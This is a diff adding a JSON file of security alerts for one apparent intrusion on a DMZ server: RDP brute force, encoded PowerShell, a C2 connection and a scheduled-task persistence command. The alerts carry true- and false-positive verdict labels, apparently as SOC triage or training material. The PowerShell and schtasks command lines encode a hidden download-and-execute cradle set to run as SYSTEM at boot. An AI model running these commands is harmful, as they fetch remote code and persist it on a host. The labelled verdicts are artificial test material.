@@ -1,0 +1,522 @@
+[
+  {
+    "alert_id": "alert-20260915-0001",
+    "schema_version": "1.0",
+    "timestamp": "2026-09-20T22:00:00Z",
+    "ingested_at": "2026-09-20T22:01:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "authentication"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Authentication: RDP Brute Force Attack",
+      "description": "Multiple failed RDP logins from 81.43.20.0.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1110.001"
+      ]
+    },
+    "alert": {
+      "title": "Authentication: RDP Brute Force Attack",
+      "summary": "50+ failed logins for Administrator from 81.43.20.0.",
+      "status": "new",
+      "confidence": 0.69,
+      "risk_score": 81,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "windows:security",
+      "vendor": "Unknown",
+      "module": "windows"
+    },
+    "observer": {
+      "name": "SRV-DMZ-01",
+      "type": "server"
+    },
+    "actor": {
+      "user": {
+        "name": "Administrator"
+      }
+    },
+    "context": {
+      "raw_source": "windows:security",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0001",
+      "host_risk": 26,
+      "user_risk": 20,
+      "asset_criticality": "Medium",
+      "attack_stage": "credential-access",
+      "kill_chain_phase": "Delivery"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1110.001",
+        "name": "Brute Force: Password Guessing"
+      }
+    },
+    "evidence": [
+      {
+        "type": "network_connection",
+        "data": {
+          "src_ip": "81.43.20.0"
+        }
+      }
+    ],
+    "network": {
+      "src_ip": "81.43.20.0",
+      "dst_ip": "10.0.0.10",
+      "dst_port": 3389
+    },
+    "additional_context": "External attacker 81.43.20.0 spraying RDP credentials.",
+    "knowledge_base": "Authentication: RDP Brute Force Attack - Verify the authentication attempt with the user or AD expert."
+  },
+  {
+    "alert_id": "alert-20260915-0002",
+    "schema_version": "1.0",
+    "timestamp": "2026-09-20T22:02:00Z",
+    "ingested_at": "2026-09-20T22:07:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "discovery"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "low",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Network: ICMP Sweep",
+      "description": "Multiple pings from internal host.",
+      "severity": "low",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Network: ICMP Sweep",
+      "summary": "Pings from Helpdesk subnet.",
+      "status": "new",
+      "confidence": 0.35,
+      "risk_score": 41,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-INTERNAL",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "helpdesk"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0002",
+      "host_risk": 50,
+      "user_risk": 87,
+      "asset_criticality": "Medium"
+    },
+    "knowledge_base": "Authorized scan, verified with IT team."
+  },
+  {
+    "alert_id": "alert-20260915-0003",
+    "schema_version": "1.0",
+    "timestamp": "2026-09-20T22:10:00Z",
+    "ingested_at": "2026-09-20T22:11:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "authentication",
+        "initial_access"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Authentication: RDP Login Success after Brute Force",
+      "description": "Successful login from 81.43.20.0.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1078.002"
+      ]
+    },
+    "alert": {
+      "title": "Authentication: RDP Login Success after Brute Force",
+      "summary": "Successful login for Administrator from 81.43.20.0.",
+      "status": "new",
+      "confidence": 0.72,
+      "risk_score": 82,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "windows:security",
+      "vendor": "Unknown",
+      "module": "windows"
+    },
+    "observer": {
+      "name": "SRV-DMZ-01",
+      "type": "server"
+    },
+    "actor": {
+      "user": {
+        "name": "Administrator"
+      }
+    },
+    "context": {
+      "raw_source": "windows:security",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0003",
+      "host_risk": 22,
+      "user_risk": 84,
+      "asset_criticality": "Medium",
+      "attack_stage": "initial-access",
+      "kill_chain_phase": "Exploitation"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1078.002",
+        "name": "Valid Accounts: Domain Accounts"
+      }
+    },
+    "evidence": [
+      {
+        "type": "logon_event",
+        "data": {
+          "status": "success"
+        }
+      }
+    ],
+    "network": {
+      "src_ip": "81.43.20.0",
+      "dst_ip": "10.0.0.10",
+      "dst_port": 3389
+    },
+    "knowledge_base": "Authentication: RDP Login Success after Brute Force - Verify the authentication attempt with the user or AD expert."
+  },
+  {
+    "alert_id": "alert-20260915-0004",
+    "schema_version": "1.0",
+    "timestamp": "2026-09-20T22:12:00Z",
+    "ingested_at": "2026-09-20T22:17:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process",
+        "execution"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Execution: Obfuscated PowerShell Command",
+      "description": "PowerShell executed with an encoded payload.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1059.001"
+      ]
+    },
+    "alert": {
+      "title": "Execution: Obfuscated PowerShell Command",
+      "summary": "Administrator executed encoded PowerShell command.",
+      "status": "new",
+      "confidence": 0.97,
+      "risk_score": 86,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "SRV-DMZ-01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "Administrator"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SUVYICgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnbWFsaWNpb3VzX3VybCcpKQ==",
+        "parent_process": "explorer.exe"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0004",
+      "host_risk": 36,
+      "user_risk": 61,
+      "asset_criticality": "Medium",
+      "attack_stage": "execution",
+      "kill_chain_phase": "Execution"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "process_name": "powershell.exe"
+        }
+      }
+    ],
+    "knowledge_base": "Execution: Obfuscated PowerShell Command - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260915-0005",
+    "schema_version": "1.0",
+    "timestamp": "2026-09-20T22:15:00Z",
+    "ingested_at": "2026-09-20T22:20:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "c2"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Network: Connection to Unknown Malicious IP",
+      "description": "PowerShell connecting to 159.203.180.92.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1105"
+      ]
+    },
+    "alert": {
+      "title": "Network: Connection to Unknown Malicious IP",
+      "summary": "PowerShell connected to 159.203.180.92 over port 443.",
+      "status": "new",
+      "confidence": 0.64,
+      "risk_score": 82,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-EDGE-01",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "Administrator"
+      },
+      "process": {
+        "name": "powershell.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0005",
+      "host_risk": 42,
+      "user_risk": 56,
+      "asset_criticality": "Medium",
+      "attack_stage": "command-and-control",
+      "kill_chain_phase": "Command and Control"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer"
+      }
+    },
+    "evidence": [
+      {
+        "type": "network_connection",
+        "data": {
+          "dst_ip": "159.203.180.92"
+        }
+      }
+    ],
+    "network": {
+      "src_ip": "10.0.0.10",
+      "dst_ip": "159.203.180.92",
+      "dst_port": 443
+    },
+    "knowledge_base": "Network: Connection to Unknown Malicious IP"
+  },
+  {
+    "alert_id": "alert-20260915-0006",
+    "schema_version": "1.0",
+    "timestamp": "2026-09-20T22:20:00Z",
+    "ingested_at": "2026-09-20T22:23:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process",
+        "persistence"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Persistence: Scheduled Task Created",
+      "description": "schtasks.exe creating a task.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1053.005"
+      ]
+    },
+    "alert": {
+      "title": "Persistence: Scheduled Task Created",
+      "summary": "schtasks.exe used to maintain persistence.",
+      "status": "new",
+      "confidence": 0.7,
+      "risk_score": 79,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "SRV-DMZ-01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "Administrator"
+      },
+      "process": {
+        "name": "schtasks.exe",
+        "command_line": "schtasks /create /sc onstart /tn \"\\Microsoft\\Windows\\UpdateAgent\\BackgroundUpdate\" /tr \"powershell.exe -WindowStyle Hidden -EncodedCommand SUVYICgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnbWFsaWNpb3VzX3VybCcpKQ==\" /F /RU SYSTEM",
+        "parent_process": "powershell.exe"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0006",
+      "host_risk": 58,
+      "user_risk": 48,
+      "asset_criticality": "Medium",
+      "attack_stage": "persistence",
+      "kill_chain_phase": "Installation"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1053.005",
+        "name": "Scheduled Task/Job: Scheduled Task"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "process_name": "schtasks.exe"
+        }
+      }
+    ],
+    "additional_context": "Attacker using schtasks to run fileless PowerShell downloading from 170.64.191.244 every system boot.",
+    "knowledge_base": "Persistence: Scheduled Task Created - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260915-0007",
+    "schema_version": "1.0",
+    "timestamp": "2026-09-20T22:25:00Z",
+    "ingested_at": "2026-09-20T22:30:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "file"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "medium",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "File: Excessive File Reads",
+      "description": "Process reading a large number of files.",
+      "severity": "medium",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "File: Excessive File Reads",
+      "summary": "Process reading a large number of files.",
+      "status": "new",
+      "confidence": 0.59,
+      "risk_score": 36,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "SRV-DMZ-01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "SYSTEM"
+      },
+      "process": {
+        "name": "VeeamAgent.exe"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0007",
+      "host_risk": 22,
+      "user_risk": 43,
+      "asset_criticality": "Medium"
+    },
+    "knowledge_base": "Authorized data transfer/sync process, verified with IT team."
+  }
+]
